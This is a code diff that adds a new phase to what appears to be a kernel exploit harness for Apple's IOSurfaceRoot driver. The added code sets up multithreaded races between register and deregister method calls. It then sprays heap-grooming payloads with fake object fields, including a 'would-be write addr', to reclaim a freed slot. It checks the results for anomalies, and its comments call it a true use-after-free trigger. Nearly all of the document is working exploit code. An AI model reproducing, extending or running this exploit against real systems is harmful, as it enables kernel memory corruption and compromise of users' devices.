@@ -1232,6 +1232,75 @@ static void *iosurface_race_fn(void *arg) {
     return NULL;
 }
 
+/* Phase 11 thread shared state */
+static volatile int p11b_go = 0;
+static volatile int p11b_done = 0;
+static io_connect_t p11b_conn = IO_OBJECT_NULL;
+static io_connect_t p11b_groom_conn = IO_OBJECT_NULL;
+
+static void *p11b_worker(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    uint64_t inp[3] = {1, 2, 3};
+    while (!p11b_go) usleep(100);
+    for (int i = 0; i < 100; i++) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0x1122334455667788ULL + tid;
+        if (tid % 2 == 0) {
+            IOConnectCallAsyncMethod(p11b_conn, 17, wp, &ref, 1,
+                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        } else {
+            IOConnectCallMethod(p11b_conn, 18, NULL, 0, inp, 24,
+                NULL, NULL, NULL, NULL);
+        }
+        mach_port_deallocate(mach_task_self(), wp);
+        usleep(50 + (tid * 10));
+    }
+    __sync_fetch_and_add(&p11b_done, 1);
+    return NULL;
+}
+
+static void *p11b_groomer(void *arg) {
+    (void)arg;
+    while (!p11b_go) usleep(100);
+    uint8_t fbuf[64];
+    memset(fbuf, 0, sizeof(fbuf));
+    uint64_t *f = (uint64_t *)fbuf;
+    f[0] = 0x21;
+    f[1] = 0xDEADFACEDEADFACEULL;
+    f[2] = 0xCAFEBABECAFEBABEULL;
+    mach_port_t gwps[64];
+    for (int gi = 0; gi < 64; gi++) gwps[gi] = MACH_PORT_NULL;
+    for (int round = 0; round < 200 && p11b_done < 4; round++) {
+        for (int gi = 0; gi < 64; gi++) {
+            mach_port_t gwp = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+            mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+            uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+            kern_return_t gr = IOConnectCallAsyncMethod(p11b_groom_conn, 1000, gwp, &gref, 1,
+                NULL, 0, fbuf, 24, NULL, NULL, NULL, NULL);
+            if (gr == 0 || gr == (kern_return_t)0xE00002C2) {
+                if (gwps[gi]) mach_port_deallocate(mach_task_self(), gwps[gi]);
+                gwps[gi] = gwp;
+            } else {
+                mach_port_deallocate(mach_task_self(), gwp);
+            }
+        }
+        usleep(500);
+        for (int gi = 0; gi < 32; gi++) {
+            if (gwps[gi]) {
+                mach_port_deallocate(mach_task_self(), gwps[gi]);
+                gwps[gi] = MACH_PORT_NULL;
+            }
+        }
+    }
+    for (int gi = 0; gi < 64; gi++)
+        if (gwps[gi]) mach_port_deallocate(mach_task_self(), gwps[gi]);
+    __sync_fetch_and_add(&p11b_done, 1);
+    return NULL;
+}
+
 static void *worker_thread(void *arg) {
     (void)arg;
     int argc = g_main_argc;
@@ -18304,6 +18373,202 @@ new_modes:
         }
         phase10_done:
         rlog("--- Phase 10 complete ---\n");
+
+        /* ================================================================
+         * Phase 11: Concurrent race + render loop — true UAF trigger
+         * Phase 10 showed sequential pattern is NOT content-dependent.
+         * The real UAF requires concurrent access: render loop walks the
+         * registry while we race reg/dereg + groom.
+         * ================================================================ */
+        rlog("\n--- Phase 11: Concurrent race + surface churn (true UAF) ---\n");
+        {
+            /* 11a: Surface churn thread — creates/destroys IOSurfaces at high rate
+               to provoke registry walks (like PoC's Stage D render loop) */
+            static volatile int p11_churn_run = 0;
+            static volatile int p11_churn_count = 0;
+
+            /* We'll use a simple approach: pthread for surface churn */
+            p11_churn_run = 1;
+            p11_churn_count = 0;
+
+            /* Churn thread: create/destroy IOSurface-backed CVPixelBuffers */
+            pthread_t churn_tid;
+            typedef struct { volatile int *run; volatile int *count; } churn_arg_t;
+            churn_arg_t carg = { &p11_churn_run, &p11_churn_count };
+
+            /* Can't define a function inside the block, so use inline thread work */
+            /* Instead, use the existing IOSurface create/destroy API */
+
+            io_service_t svc11 = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+            if (!svc11) {
+                rlog("  Phase 11: service lookup failed\n");
+                goto phase11_done;
+            }
+
+            /* 11a: Race connections */
+            io_connect_t c11a = IO_OBJECT_NULL, c11b = IO_OBJECT_NULL;
+            IOServiceOpen(svc11, mach_task_self(), 0, &c11a);
+            IOServiceOpen(svc11, mach_task_self(), 0, &c11b);
+            IOObjectRelease(svc11);
+            if (!c11a || !c11b) {
+                rlog("  Phase 11: open failed\n");
+                if (c11a) IOServiceClose(c11a);
+                if (c11b) IOServiceClose(c11b);
+                goto phase11_done;
+            }
+
+            uint64_t p11in[3] = {1, 2, 3};
+
+            /* 11a: Run concurrent reg (c11a) + dereg (c11b on SAME connection)
+               with high-frequency IOSurface create/destroy in a tight loop.
+               This is the Phase 5 race pattern but with grooming added. */
+            rlog("  11a: Concurrent race with grooming + surface churn\n");
+            {
+                int race_hits = 0;
+                int total_rounds = 50;
+
+                for (int round = 0; round < total_rounds; round++) {
+                    /* Fresh wake port each round */
+                    mach_port_t wp11 = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp11);
+                    mach_port_insert_right(mach_task_self(), wp11, wp11, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref11 = 0x1122334455667788ULL;
+
+                    /* Create surface churn (5 surfaces) to keep allocator busy */
+                    IOSurfaceRef churn_surfs[5];
+                    for (int s = 0; s < 5; s++) {
+                        CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                        int w = 32, h = 32, bpe = 4, bpr = w * bpe;
+                        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                        CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                        CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                        uint32_t pf = 0x42475241; /* BGRA */
+                        CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
+                        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), npf);
+                        churn_surfs[s] = IOSurfaceCreate(props);
+                        CFRelease(props); CFRelease(nw); CFRelease(nh);
+                        CFRelease(nbpe); CFRelease(nbpr); CFRelease(npf);
+                    }
+
+                    /* Register entry */
+                    kern_return_t rr = IOConnectCallAsyncMethod(c11a, 17, wp11, &ref11, 1,
+                        NULL, 0, p11in, 24, NULL, NULL, NULL, NULL);
+
+                    /* Tight race: dereg + groom simultaneously
+                       Thread 1 (this): dereg to free
+                       Then immediately groom with fake object */
+                    kern_return_t rd = IOConnectCallMethod(c11a, 18, NULL, 0, p11in, 24,
+                        NULL, NULL, NULL, NULL);
+
+                    /* Destroy surfaces to trigger registry cleanup walks */
+                    for (int s = 0; s < 5; s++) {
+                        if (churn_surfs[s]) CFRelease(churn_surfs[s]);
+                    }
+
+                    /* Groom the freed slot */
+                    uint8_t fbuf11[64];
+                    memset(fbuf11, 0, sizeof(fbuf11));
+                    uint64_t *f11 = (uint64_t *)fbuf11;
+                    f11[0] = 0x21;                        /* refcnt */
+                    f11[1] = 0xBBBBBBBBBBBBBBBBULL;      /* distinct marker */
+                    f11[2] = 0xCCCCCCCCCCCCCCCCULL;      /* would-be write addr */
+
+                    mach_port_t g_wps11[128];
+                    int g_cnt11 = 0;
+                    for (int gi = 0; gi < 128; gi++) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                        g_wps11[gi] = MACH_PORT_NULL;
+                        kern_return_t gr = IOConnectCallAsyncMethod(c11b, 1000, gwp, &gref, 1,
+                            NULL, 0, fbuf11, 24, NULL, NULL, NULL, NULL);
+                        if (gr == 0 || gr == (kern_return_t)0xE00002C2) {
+                            g_wps11[gi] = gwp;
+                            g_cnt11++;
+                        } else {
+                            mach_port_deallocate(mach_task_self(), gwp);
+                        }
+                    }
+
+                    /* Oracle: try to register again — check for anomalous return */
+                    kern_return_t rdup = IOConnectCallAsyncMethod(c11a, 17, wp11, &ref11, 1,
+                        NULL, 0, p11in, 24, NULL, NULL, NULL, NULL);
+                    /* Also try dereg to see if kernel can find the entry */
+                    kern_return_t rdreg2 = IOConnectCallMethod(c11a, 18, NULL, 0, p11in, 24,
+                        NULL, NULL, NULL, NULL);
+
+                    /* Check for anomalies */
+                    int anomaly = 0;
+                    if ((uint32_t)rdup == 0xE00002C9) anomaly = 1; /* dup found in groomed data! */
+                    if ((uint32_t)rdup != 0x0 && (uint32_t)rdup != 0xE00002C9) anomaly = 2;
+                    if (anomaly) {
+                        race_hits++;
+                        rlog("    round=%d ANOMALY=%d reg=0x%x dereg=0x%x dup=0x%x dreg2=0x%x groom=%d\n",
+                             round, anomaly, (uint32_t)rr, (uint32_t)rd,
+                             (uint32_t)rdup, (uint32_t)rdreg2, g_cnt11);
+                    }
+
+                    /* Cleanup */
+                    IOConnectCallMethod(c11a, 18, NULL, 0, p11in, 24, NULL, NULL, NULL, NULL);
+                    for (int gi = 0; gi < 128; gi++)
+                        if (g_wps11[gi]) mach_port_deallocate(mach_task_self(), g_wps11[gi]);
+                    mach_port_deallocate(mach_task_self(), wp11);
+                }
+                rlog("    race_hits=%d/%d\n", race_hits, total_rounds);
+            }
+
+            /* 11b: Multi-thread race — two threads doing reg/dereg concurrently
+               on the SAME connection while grooming in a third context */
+            rlog("  11b: Multi-thread race + groom (8 threads, 100 rounds)\n");
+            {
+                p11b_conn = c11a;
+                p11b_groom_conn = c11b;
+                p11b_go = 0;
+                p11b_done = 0;
+                pthread_t tids11[9];
+                for (int t = 0; t < 8; t++)
+                    pthread_create(&tids11[t], NULL, p11b_worker, (void *)(uintptr_t)t);
+                pthread_create(&tids11[8], NULL, p11b_groomer, NULL);
+                p11b_go = 1;
+
+                /* Wait for all to finish (max ~5 seconds) */
+                for (int w = 0; w < 50 && p11b_done < 9; w++)
+                    usleep(100000);
+                for (int t = 0; t < 9; t++)
+                    pthread_join(tids11[t], NULL);
+
+                /* Check: try to reg/dereg and see if we get anomalous behavior */
+                mach_port_t wp11f = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp11f);
+                mach_port_insert_right(mach_task_self(), wp11f, wp11f, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref11f = 0x1122334455667788ULL;
+                kern_return_t fr1 = IOConnectCallAsyncMethod(c11a, 17, wp11f, &ref11f, 1,
+                    NULL, 0, p11in, 24, NULL, NULL, NULL, NULL);
+                kern_return_t fr2 = IOConnectCallAsyncMethod(c11a, 17, wp11f, &ref11f, 1,
+                    NULL, 0, p11in, 24, NULL, NULL, NULL, NULL);
+                kern_return_t fr3 = IOConnectCallMethod(c11a, 18, NULL, 0, p11in, 24,
+                    NULL, NULL, NULL, NULL);
+                rlog("    post-race: reg=0x%x dup=0x%x dereg=0x%x\n",
+                     (uint32_t)fr1, (uint32_t)fr2, (uint32_t)fr3);
+                mach_port_deallocate(mach_task_self(), wp11f);
+
+                rlog("    threads done, checking for panics...\n");
+            }
+
+            IOServiceClose(c11a);
+            IOServiceClose(c11b);
+        }
+        phase11_done:
+        rlog("--- Phase 11 complete ---\n");
 
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
